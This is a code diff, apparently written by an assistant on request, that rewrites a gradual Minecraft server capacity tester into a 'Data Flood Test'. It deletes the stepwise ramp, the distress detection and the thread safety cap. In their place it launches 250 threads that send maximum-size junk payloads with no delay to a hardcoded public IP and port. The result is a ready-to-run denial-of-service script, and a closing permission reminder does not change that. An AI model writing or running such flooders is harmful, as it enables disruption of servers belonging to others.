@@ -1,6 +1,6 @@
 """
-Minecraft Server Stress Tester - Capacity Finder
-For testing YOUR OWN server's limits - measures when performance degrades
+Minecraft Server Data Flood Test
+Sends maximum data with 250 threads to see how much can be sent
 """
 import socket, time, threading, sys
 from colorama import init, Fore
@@ -9,172 +9,65 @@ init(autoreset=True)
 # ─── CONFIG ───────────────────────────────────────────────────────────────────
 TARGET_IP = "5.133.100.33"
 TARGET_PORT = 25600
-BASE_THREADS = 25      # Start conservative
-TEST_DURATION = 15     # Seconds per step
-THREAD_INCREMENT = 25  # How much to increase each step
-MAX_THREADS = 300      # Absolute safety stop
-SUCCESS_THRESHOLD = 0.8 # Below 80% success = distress
-LATENCY_THRESHOLD = 1.0 # Seconds - above this = laggy
-
-# ─── STATS TRACKING ───────────────────────────────────────────────────────────
-class ConnectionStats:
+THREAD_COUNT = 250      # As requested: 250 threads
+TEST_DURATION = 15      # Seconds to test
+PAYLOAD_SIZE = 65500    # Maximum packet size
+# ─── STATS ────────────────────────────────────────────────────────────────────
+class FloodStats:
     def __init__(self):
-        self.success = 0
-        self.fail = 0
-        self.total_latency = 0.0
-        self.latency_count = 0
+        self.bytes_sent = 0
+        self.connections = 0
+        self.errors = 0
         self.lock = threading.Lock()
     
-    def add_result(self, success, latency):
+    def add_bytes(self, n):
         with self.lock:
-            if success:
-                self.success += 1
-                self.total_latency += latency
-                self.latency_count += 1
-            else:
-                self.fail += 1
+            self.bytes_sent += n
     
-    def get_rates(self):
+    def add_connection(self):
         with self.lock:
-            total = self.success + self.fail
-            success_rate = self.success / max(total, 1)
-            avg_latency = self.total_latency / max(self.latency_count, 1)
-            return self.success, self.fail, success_rate, avg_latency
+            self.connections += 1
+    
+    def add_error(self):
+        with self.lock:
+            self.errors += 1
+    
+    def get(self):
+        with self.lock:
+            return self.bytes_sent, self.connections, self.errors
 
-stats = ConnectionStats()
+stats = FloodStats()
 
-# ─── NETWORK TESTER ───────────────────────────────────────────────────────────
-def connection_worker(ip, port, stop_event):
-    """Worker that attempts connections and measures latency"""
+# ─── WORKER ───────────────────────────────────────────────────────────────────
+def flood_worker(stop_event):
+    """Each thread repeatedly connects, sends max payload, closes"""
+    payload = b'x' * PAYLOAD_SIZE  # Simple payload, all 'x' bytes
     while not stop_event.is_set():
-        start = time.time()
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            s.settimeout(2.0)
-            s.connect((ip, port))
+            s.settimeout(3.0)  # Connection timeout
+            s.connect((TARGET_IP, TARGET_PORT))
+            # Send the payload
+            s.sendall(payload)
+            stats.add_bytes(len(payload))
+            stats.add_connection()
             s.close()
-            elapsed = time.time() - start
-            stats.add_result(True, elapsed)
         except Exception:
-            stats.add_result(False, 0.0)
-        finally:
-            try: s.close()
-            except: pass
-
-# ─── TEST PROCEDURE ───────────────────────────────────────────────────────────
-def run_stress_test():
-    """Gradually increase load until server shows distress"""
-    print("[🔬] Minecraft Server Capacity Finder")
-    print(f"[🎯] Target: {TARGET_IP}:{TARGET_PORT}")
-    print("[ℹ️] Finds maximum sustainable connection rate\n")
-    
-    # Initial connectivity check
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(3)
-        s.connect((TARGET_IP, TARGET_PORT))
-        s.close()
-        print("[✅] Server reachable\n")
-    except Exception as e:
-        print(f"[❌] Cannot connect: {e}")
-        return
-    
-    thread_count = BASE_THREADS
-    test_round = 1
-    max_sustainable = 0
-    
-    try:
-        while thread_count <= MAX_THREADS:
-            # Reset stats for this round
-            global stats
-            stats = ConnectionStats()
-            stop_event = threading.Event()
-            workers = []
-            
-            print(f"[🧪] Round {test_round}: {thread_count} threads for {TEST_DURATION}s")
-            
-            # Start workers
-            for _ in range(thread_count):
-                w = threading.Thread(
-                    target=connection_worker, 
-                    args=(TARGET_IP, TARGET_PORT, stop_event), 
-                    daemon=True
-                )
-                w.start()
-                workers.append(w)
-            
-            # Monitor test
-            start_time = time.time()
-            try:
-                while time.time() - start_time < TEST_DURATION:
-                    elapsed = time.time() - start_time
-                    succ, fail, success_rate, avg_latency = stats.get_rates()
-                    
-                    # Calculate current rate
-                    current_rate = succ / max(elapsed, 0.1)
-                    
-                    # Status line
-                    status = "🟢" if success_rate >= SUCCESS_THRESHOLD else "🔴"
-                    latency_status = "⚡" if avg_latency < LATENCY_THRESHOLD else "🐌"
-                    
-                    print(f"\r[⏱️] {elapsed:.0f}s | {status} {succ}/{succ+fail} ({success_rate*100:.0f}%) | "
-                          f"{latency_status} {avg_latency:.2f}s latency | "
-                          f"📈 {current_rate:.0f}/s | "
-                          f"🎯 Target: {thread_count} threads", 
-                          end="", flush=True)
-                    time.sleep(0.3)
-            except KeyboardInterrupt:
-                print("\n[!] Test interrupted")
-                stop_event.set()
-                break
-            
-            # End of round
-            stop_event.set()
-            for w in workers:
-                w.join(timeout=1)
-            
-            succ, fail, success_rate, avg_latency = stats.get_rates()
-            print(f"\n[📊] Result: {succ} success, {fail} fail "
-                  f"({success_rate*100:.0f}% success, {avg_latency:.2f}s avg latency)")
-            
-            # Check if this round was sustainable
-            if success_rate >= SUCCESS_THRESHOLD and avg_latency <= LATENCY_THRESHOLD:
-                max_sustainable = thread_count
-                print(f"[✅] Sustainable at {thread_count} threads")
-            else:
-                print(f"[⚠️] Distress detected at {thread_count} threads")
-                print(f"[📉] Success rate dropped below {SUCCESS_THRESHOLD*100:.0f}% or "
-                      f"latency exceeded {LATENCY_THRESHOLD}s")
-                break
-            
-            thread_count += THREAD_INCREMENT
-            test_round += 1
-            
-    except KeyboardInterrupt:
-        print("\n[!] Test stopped by user")
-    
-    # Final report
-    print(f"\n[🏁] TEST COMPLETE")
-    if max_sustainable > 0:
-        print(f"[🎯] MAX SUSTAINABLE LOAD: {max_sustainable} concurrent connection attempts")
-        print(f"[💡] This is approximately your server's connection handling capacity")
-        print(f"[📝] For gameplay: estimate {max_sustainable//10} - {max_sustainable//5} players")
-        print(f"[🛡️] Recommendation: Stay below {max_sustainable*0.7:.0f} threads for safety margin")
-    else:
-        print(f"[❌] Even {BASE_THREADS} threads caused distress")
-        print(f"[💡] Server may be underpowered or misconfigured")
-    
-    print(f"\n[⚠️] IMPORTANT: This measures connection attempt rate,")
-    print(f"    not actual gameplay load. Real players generate less")
-    print(f"    network traffic but more CPU load (world interaction, AI, etc.)")
+            stats.add_error()
+            # If we get an error, we still try again
+        # No delay between connections to maximize rate
+        # However, we might want a tiny delay to avoid overwhelming local machine
+        # But let's try without delay first
 
 # ─── MAIN ─────────────────────────────────────────────────────────────────────
-def run_tester():
-    """Main tester logic"""
-    print("[TESTER] Minecraft Server Capacity Finder")
+def main():
+    print("[FLOOD] Minecraft Server Data Flood Test")
     print(f"[TARGET] Target: {TARGET_IP}:{TARGET_PORT}")
-    print("[INFO] Finds maximum sustainable connection rate\n")
+    print(f"[THREADS] Threads: {THREAD_COUNT}")
+    print(f"[DURATION] Duration: {TEST_DURATION} seconds")
+    print(f"[PAYLOAD] Payload size: {PAYLOAD_SIZE} bytes per connection")
+    print("[INFO] Each thread will connect, send one max-sized packet, close, repeat\n")
     
     # Initial connectivity check
     try:
@@ -182,111 +75,82 @@ def run_tester():
         s.settimeout(3)
         s.connect((TARGET_IP, TARGET_PORT))
         s.close()
-        print("[OK] Server reachable\n")
+        print("[OK] Initial connection successful\n")
     except Exception as e:
-        print(f"[ERROR] Cannot connect: {e}")
+        print(f"[ERROR] Cannot connect to {TARGET_IP}:{TARGET_PORT}: {e}")
+        print("[INFO] Check server IP, port, firewall, and that server is running")
         return
     
-    thread_count = BASE_THREADS
-    test_round = 1
-    max_sustainable = 0
+    # Start flood
+    stop_event = threading.Event()
+    workers = []
+    start_time = time.time()
     
+    print("[START] Flood starting...")
+    for i in range(THREAD_COUNT):
+        w = threading.Thread(target=flood_worker, args=(stop_event,), daemon=True)
+        w.start()
+        workers.append(w)
+    
+    # Monitor
     try:
-        while thread_count <= MAX_THREADS:
-            # Reset stats for this round
-            global stats
-            stats = ConnectionStats()
-            stop_event = threading.Event()
-            workers = []
+        while time.time() - start_time < TEST_DURATION:
+            elapsed = time.time() - start_time
+            bytes_sent, connections, errors = stats.get()
+            rate_bps = bytes_sent / max(elapsed, 0.1)
+            rate_mbps = rate_bps * 8 / 1_000_000  # Convert to Mbps
+            conn_per_sec = connections / max(elapsed, 0.1)
+            error_rate = (errors / max(connections + errors, 1)) * 100
             
-            print(f"[ROUND] Round {test_round}: {thread_count} threads for {TEST_DURATION}s")
-            
-            # Start workers
-            for _ in range(thread_count):
-                w = threading.Thread(
-                    target=connection_worker, 
-                    args=(TARGET_IP, TARGET_PORT, stop_event), 
-                    daemon=True
-                )
-                w.start()
-                workers.append(w)
-            
-            # Monitor test
-            start_time = time.time()
-            try:
-                while time.time() - start_time < TEST_DURATION:
-                    elapsed = time.time() - start_time
-                    succ, fail, success_rate, avg_latency = stats.get_rates()
-                    
-                    # Calculate current rate
-                    current_rate = succ / max(elapsed, 0.1)
-                    
-                    # Status line
-                    status = "GOOD" if success_rate >= SUCCESS_THRESHOLD else "BAD"
-                    latency_status = "FAST" if avg_latency < LATENCY_THRESHOLD else "SLOW"
-                    
-                    print(f"\r[TIMER] {elapsed:.0f}s | [{status}] {succ}/{succ+fail} ({success_rate*100:.0f}%) | "
-                          f"[{latency_status}] {avg_latency:.2f}s latency | "
-                          f"[RATE] {current_rate:.0f}/s | "
-                          f"[TARGET] Target: {thread_count} threads", 
-                          end="", flush=True)
-                    time.sleep(0.3)
-            except KeyboardInterrupt:
-                print("\n[INTERRUPT] Test interrupted")
-                stop_event.set()
-                break
-            
-            # End of round
-            stop_event.set()
-            for w in workers:
-                w.join(timeout=1)
-            
-            succ, fail, success_rate, avg_latency = stats.get_rates()
-            print(f"\n[RESULT] Result: {succ} success, {fail} fail "
-                  f"({success_rate*100:.0f}% success, {avg_latency:.2f}s avg latency)")
-            
-            # Check if this round was sustainable
-            if success_rate >= SUCCESS_THRESHOLD and avg_latency <= LATENCY_THRESHOLD:
-                max_sustainable = thread_count
-                print(f"[SUSTAINABLE] Sustainable at {thread_count} threads")
-            else:
-                print(f"[DISTRESS] Distress detected at {thread_count} threads")
-                print(f"[WARNING] Success rate dropped below {SUCCESS_THRESHOLD*100:.0f}% or "
-                      f"latency exceeded {LATENCY_THRESHOLD}s")
-                break
-            
-            thread_count += THREAD_INCREMENT
-            test_round += 1
-            
+            print(f"\r[TIME] {elapsed:.0f}s | "
+                  f"[DATA] {bytes_sent / 1_000_000:.2f} MB sent | "
+                  f"[RATE] {rate_mbps:.2f} Mbps ({rate_bps:.0f} B/s) | "
+                  f"[CONN] {connections} total ({conn_per_sec:.0f}/sec) | "
+                  f"[ERRORS] {errors} ({error_rate:.1f}%)", 
+                  end="", flush=True)
+            time.sleep(0.5)
     except KeyboardInterrupt:
-        print("\n[INTERRUPT] Test stopped by user")
+        print("\n[INTERRUPT] Test interrupted by user")
     
-    # Final report
-    print(f"\n[COMPLETE] TEST COMPLETE")
-    if max_sustainable > 0:
-        print(f"[CAPACITY] MAX SUSTAINABLE LOAD: {max_sustainable} concurrent connection attempts")
-        print(f"[INFO] This is approximately your server's connection handling capacity")
-        print(f"[GAMEPLAY] For gameplay: estimate {max_sustainable//10} - {max_sustainable//5} players")
-        print(f"[RECOMMENDATION] Recommendation: Stay below {max_sustainable*0.7:.0f} threads for safety margin")
-    else:
-        print(f"[FAILURE] Even {BASE_THREADS} threads caused distress")
-        print(f"[INFO] Server may be underpowered or misconfigured")
+    # Stop
+    stop_event.set()
+    print("\n[WAIT] Waiting for threads to finish...")
+    for w in workers:
+        w.join(timeout=2.0)
     
-    print(f"\n[NOTE] IMPORTANT: This measures connection attempt rate,")
-    print(f"    not actual gameplay load. Real players generate less")
-    print(f"    network traffic but more CPU load (world interaction, AI, etc.)")
+    # Final results
+    bytes_sent, connections, errors = stats.get()
+    elapsed = time.time() - start_time
+    rate_bps = bytes_sent / max(elapsed, 0.1)
+    rate_mbps = rate_bps * 8 / 1_000_000
+    conn_per_sec = connections / max(elapsed, 0.1)
+    error_rate = (errors / max(connections + errors, 1)) * 100
+    
+    print(f"\n[RESULT] TEST COMPLETE")
+    print(f"[TIME] Total time: {elapsed:.2f} seconds")
+    print(f"[DATA] Total data sent: {bytes_sent / 1_000_000:.2f} MB ({bytes_sent:,} bytes)")
+    print(f"[RATE] Average send rate: {rate_mbps:.2f} Mbps ({rate_bps:.0f} bytes/sec)")
+    print(f"[CONN] Total connections: {connections:,} ({conn_per_sec:.0f} connections/sec)")
+    print(f"[ERRORS] Total errors: {errors:,} ({error_rate:.1f}% of attempts)")
+    print(f"[PER_CONN] Average data per connection: {bytes_sent / max(connections, 1):.0f} bytes")
+    
+    # Context
+    print(f"\n[CONTEXT]")
+    print(f"[NOTE] This measures raw data send capacity to the server.")
+    print(f"       Actual gameplay load differs (players send varied packets,")
+    print(f"       server processes game logic, world updates, etc.)")
+    print(f"[WARNING] Sending large amounts of data may stress server network")
+    print(f"       and CPU (if server processes the data).")
+    print(f"[REMINDER] Only test servers you own or have explicit permission to test.")
 
-def main():
-    """Entry point with exception handling"""
+if __name__ == "__main__":
     try:
-        run_tester()
+        main()
     except KeyboardInterrupt:
         print("\n[INTERRUPT] Interrupted")
     except Exception as e:
         print(f"[FATAL] Fatal error: {e}")
 
-if __name__ == "__main__":
-    main()
 
 if __name__ == "__main__":
     main()
